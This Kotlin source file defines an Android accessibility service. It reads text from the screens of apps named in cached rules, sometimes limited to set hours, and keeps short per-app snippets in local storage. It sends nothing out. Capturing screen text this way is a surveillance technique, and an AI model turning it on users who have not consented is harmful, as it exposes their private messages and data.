package com.example.myandroid

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.content.Context

class MyAccessibilityService : AccessibilityService() {

    override fun onServiceConnected() {
        super.onServiceConnected()
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        val pkgName = event.packageName?.toString() ?: return
        val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
        
        // --- GATEKEEPER LOGIC ---
        // Check if this app is in our allowed list
        val rulesStr = prefs.getString("cached_rules", "{}")
        // Note: For extreme performance, parsing should be cached in a variable, 
        // but Android kills services often, so safe parsing is robust.
        val rules = try { org.json.JSONObject(rulesStr) } catch (e: Exception) { org.json.JSONObject() }
        
        if (!rules.has(pkgName)) {
            // Rule mismatch: Optimization - Ignore this app completely to save CPU
            return
        }

        // Check Strategy
        val rule = rules.getJSONObject(pkgName)
        val strategy = rule.optString("strategy", "ALWAYS")
        
        if (strategy == "TIME_WINDOW") {
            val params = rule.optJSONObject("params")
            val start = params?.optInt("start", 0) ?: 0
            val end = params?.optInt("end", 24) ?: 24
            val currentHour = java.util.Calendar.getInstance().get(java.util.Calendar.HOUR_OF_DAY)
            if (currentHour < start || currentHour >= end) return
        }
        
        // If we passed the checks, proceed to heavy lifting
        val source = event.source ?: return
        val textContent = StringBuilder()
        extractText(source, textContent)
        
        if (textContent.isNotEmpty()) {
            val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
            
            // 1. Resolve Human Readable App Name
            val pm = packageManager
            val pkgName = event.packageName?.toString() ?: "System"
            val appName = try {
                pm.getApplicationLabel(pm.getApplicationInfo(pkgName, 0)).toString()
            } catch (e: Exception) {
                pkgName
            }

            // 2. Load Existing History (JSON Structure)
            val historyStr = prefs.getString("text_history_by_app", "{}")
            val rootJson = try {
                org.json.JSONObject(historyStr)
            } catch (e: Exception) {
                org.json.JSONObject()
            }

            // 3. Get/Create Array for this specific App
            val appArray = rootJson.optJSONArray(appName) ?: org.json.JSONArray()

            // 4. Append New Data Entry
            val entry = org.json.JSONObject()
            entry.put("ts", System.currentTimeMillis())
            entry.put("txt", textContent.take(100).toString())
            appArray.put(entry)

            // 5. SAFETY: Keep only last 20 entries per app
            while (appArray.length() > 20) {
                appArray.remove(0)
            }

            // 6. Save Back to Storage
            rootJson.put(appName, appArray)
            
            prefs.edit()
                .putString("text_history_by_app", rootJson.toString())
                .putInt("interaction_count", prefs.getInt("interaction_count", 0) + 1)
                .putString("last_screen_text", "[$appName] ${textContent.take(30)}...")
                .apply()
        }
    }

    private fun extractText(node: AccessibilityNodeInfo?, sb: StringBuilder) {
        if (node == null) return
        if (node.text != null && node.text.isNotEmpty()) {
            sb.append(node.text).append(" ")
        }
        for (i in 0 until node.childCount) {
            extractText(node.getChild(i), sb)
        }
    }

    override fun onInterrupt() {
    }
}